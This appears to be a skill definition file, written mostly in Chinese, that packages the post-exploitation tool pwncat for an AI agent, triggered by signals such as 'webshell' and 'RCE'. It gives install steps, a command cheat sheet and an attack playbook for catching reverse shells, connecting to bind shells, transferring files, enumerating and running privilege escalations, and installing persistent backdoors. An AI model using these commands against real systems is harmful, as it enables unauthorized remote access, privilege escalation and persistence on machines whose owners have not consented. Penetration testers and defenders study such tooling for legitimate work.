---
name: pwncat-shell-manager
description: "pwncat: Shell hosting and automatic privilege escalation. Signals: webshell, RCE, start listener, file transfer, list available privilege escalations."
zh-signals: "pwncat: shell 托管+自动提权。信号:webshell,rce,起监听,文件传输,列可用提权。"
---

# pwncat

- 攻击大类:C13 远程命令执行与WebShell
- 上游仓库:https://github.com/calebstewart/pwncat
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install pwncat-cs
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `pwncat-cs 10.0.0.5:4444` | 连接 bind shell |
| `pwncat-cs -lp 4444` | 起监听 |
| `upload/download` | 文件传输 |
| `escalate -l` | 列可用提权 |
| `run enumerate.system` | 枚举模块 |
| `backdoor install` | 装持久化后门 |

## 攻击场景 Playbook

### shell 托管+自动提权

```bash
pwncat-cs -lp 4444  # 目标弹回 shell 后自动升级 TTY
pwncat> escalate run  # 枚举 sudo/SUID/capability 并尝试提权
```

## 注意事项

Python 写的 netcat 升级版,自动处理 TTY/回显;cs 版兼容 pwncat 原项目。
